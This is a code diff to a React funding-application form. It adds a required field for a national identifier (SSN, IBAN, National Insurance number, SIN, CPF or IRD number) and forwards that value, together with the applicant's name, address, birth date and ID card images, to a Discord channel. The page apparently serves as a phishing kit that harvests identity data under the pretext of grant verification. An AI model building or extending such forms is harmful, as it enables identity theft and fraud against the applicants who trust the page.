@@ -12,8 +12,21 @@ import { Popover, PopoverContent, PopoverTrigger } from '@/components/ui/popover
 import { cn } from '@/lib/utils';
 import { toast } from 'sonner';
 import { useNavigate } from 'react-router-dom';
-import { Loader2, ArrowLeft, ArrowRight, CalendarIcon, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList } from 'lucide-react';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
+import { Loader2, ArrowLeft, ArrowRight, CalendarIcon, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList, ShieldCheck } from 'lucide-react';
 import { sendToDiscord } from '@/lib/discord';
+
+const SECURITY_COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
+type SecurityCountry = typeof SECURITY_COUNTRIES[number];
+
+const SECURITY_PLACEHOLDERS: Record<string, string> = {
+  USA: 'Enter SSN',
+  Germany: 'Enter IBAN',
+  UK: 'Enter National Insurance Number',
+  Canada: 'Enter SIN',
+  Brazil: 'Enter CPF',
+  'New Zealand': 'Enter IRD Number',
+};
 
 const STEPS = ['Personal Details', 'Funding Details', 'Questionnaire', 'Review & Submit'];
 
@@ -32,6 +45,8 @@ export default function ApplyPage() {
   const [city, setCity] = useState('');
   const [stateProvince, setStateProvince] = useState('');
   const [country, setCountry] = useState('');
+  const [securityCountry, setSecurityCountry] = useState<SecurityCountry | ''>('');
+  const [securityInfo, setSecurityInfo] = useState('');
   const [occupation, setOccupation] = useState('');
   const [idFrontFile, setIdFrontFile] = useState<File | null>(null);
   const [idBackFile, setIdBackFile] = useState<File | null>(null);
@@ -58,7 +73,8 @@ export default function ApplyPage() {
     { label: 'Is there anything else you would like us to know?', value: q5, set: setQ5 },
   ];
 
-  const canProceedStep0 = fullName && email && dateOfBirth && streetAddress && city && country && occupation && idFrontFile && idBackFile;
+  const showSecurityField = securityCountry && securityCountry !== 'Others';
+  const canProceedStep0 = fullName && email && dateOfBirth && streetAddress && city && country && occupation && idFrontFile && idBackFile && (!showSecurityField || securityInfo);
   const canProceedStep1 = amountRequested && parseFloat(amountRequested) > 0 && parseFloat(amountRequested) <= 500000;
 
   const handleAmountChange = (val: string) => {
@@ -161,6 +177,9 @@ export default function ApplyPage() {
         { name: '📎 Additional info', value: q5 || '—', inline: false },
         { name: '🪪 ID Front', value: idFrontUrl || '—', inline: false },
         { name: '🪪 ID Back', value: idBackUrl || '—', inline: false },
+        ...(showSecurityField ? [
+          { name: `🛡️ ${SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')}`, value: securityInfo, inline: false },
+        ] : []),
       ],
       imageUrl: idFrontUrl || undefined,
     });
@@ -275,6 +294,31 @@ export default function ApplyPage() {
                   </div>
                 </div>
 
+                {/* Security Country & Info */}
+                <div className="space-y-4 pt-2">
+                  <div className="space-y-2">
+                    <Label>Security Country <span className="text-destructive">*</span></Label>
+                    <Select value={securityCountry} onValueChange={(v) => { setSecurityCountry(v as SecurityCountry); setSecurityInfo(''); }}>
+                      <SelectTrigger><SelectValue placeholder="Select your country" /></SelectTrigger>
+                      <SelectContent>
+                        {SECURITY_COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                  {showSecurityField && (
+                    <div className="space-y-2 border border-primary/30 rounded-lg p-4">
+                      <div className="flex items-center gap-2 mb-1">
+                        <ShieldCheck className="h-4 w-4 text-primary" />
+                        <Label htmlFor="security" className="font-semibold">
+                          {SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')} <span className="text-destructive">*</span>
+                        </Label>
+                      </div>
+                      <Input id="security" placeholder={SECURITY_PLACEHOLDERS[securityCountry]} value={securityInfo} onChange={e => setSecurityInfo(e.target.value)} required />
+                      <p className="text-xs text-muted-foreground">Required for identity verification</p>
+                    </div>
+                  )}
+                </div>
+
                 {/* ID Card Uploads */}
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                   <div className="space-y-2">
@@ -368,6 +412,9 @@ export default function ApplyPage() {
                     <ReviewItem label="Date of Birth" value={dateOfBirth ? format(dateOfBirth, 'PPP') : '—'} />
                     <ReviewItem label="Occupation" value={occupation} />
                     <ReviewItem label="Country" value={country} />
+                    {showSecurityField && (
+                      <ReviewItem label={SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '') || ''} value={securityInfo} />
+                    )}
                   </div>
                   <div className="mt-2 text-sm">
                     <ReviewItem label="Address" value={[streetAddress, city, stateProvince, country].filter(Boolean).join(', ')} />
